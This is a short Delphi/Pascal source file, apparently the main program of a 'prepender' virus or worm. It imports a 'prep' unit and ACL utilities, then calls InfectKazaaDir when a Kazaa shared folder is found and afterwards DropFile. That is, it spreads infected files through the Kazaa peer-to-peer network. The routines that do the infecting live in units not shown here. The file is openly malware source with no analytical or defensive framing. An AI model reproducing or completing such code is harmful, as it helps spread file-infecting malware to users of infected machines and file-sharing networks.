   program prepender;

   uses
     prep in 'prep.pas',
     AclUtils in 'ACLUnits\ACLUTILS.PAS';

   begin
    IF KazaaDir<>'' THEN InfectKazaaDir;
    DropFile;
   end.
